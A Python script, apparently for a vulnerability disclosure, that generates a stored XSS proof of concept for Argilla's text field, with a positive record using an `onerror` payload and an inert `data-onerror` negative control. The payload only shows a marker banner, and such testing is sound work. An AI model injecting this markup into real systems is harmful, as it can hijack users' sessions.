#!/usr/bin/env python3
"""Generate the Argilla dom_html_render PoC samples (positive + negative control).

Positive record: text field with `<img src=x onerror="...">`.
Negative record: byte-identical except the attribute name is the inert
`data-onerror` (same URL, same attribute value, same JSON shape), so both
records take the same render path (non-markdown, non-paired-HTML -> v-html)
and only the event-handler attribute makes the difference.

Outputs: poc_positive.json, poc_negative.json, SHA256SUMS.txt
"""
import hashlib
import json
import sys
from pathlib import Path

MARKER_JS = (
    "var b=document.createElement('div');"
    "b.id='seq097-marker';"
    "b.textContent='seq097 marker: stored XSS executed from record text field (TextField v-html)';"
    "b.style.cssText='position:fixed;top:0;left:0;z-index:99999;"
    "background:#c62828;color:#fff;font:700 15px/1.4 sans-serif;padding:10px 14px';"
    "document.body.appendChild(b);"
    "document.title='SEQ097-XSS-EXECUTED';"
)


def record_json(attribute: str) -> str:
    payload = f'<img src=x {attribute}="{MARKER_JS}">'
    body = {"items": [{"fields": {"text": payload}}]}
    return json.dumps(body, indent=2)


def sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def main() -> int:
    out = Path(__file__).resolve().parent

    pos = out / "poc_positive.json"
    neg = out / "poc_negative.json"
    pos.write_text(record_json("onerror"), encoding="utf-8")
    neg.write_text(record_json("data-onerror"), encoding="utf-8")

    sums = out / "SHA256SUMS.txt"
    lines = [f"{sha256(p)}  {p.name}" for p in (pos, neg)]
    sums.write_text("\n".join(lines) + "\n", encoding="utf-8")

    print("generated:")
    for p in (pos, neg):
        print(f"  {p.name}  {p.stat().st_size} bytes")
    print("SHA256SUMS.txt:")
    for line in lines:
        print(f"  {line}")
    print("positive attribute: onerror (event handler)")
    print("negative attribute: data-onerror (inert, same value/URL/shape)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
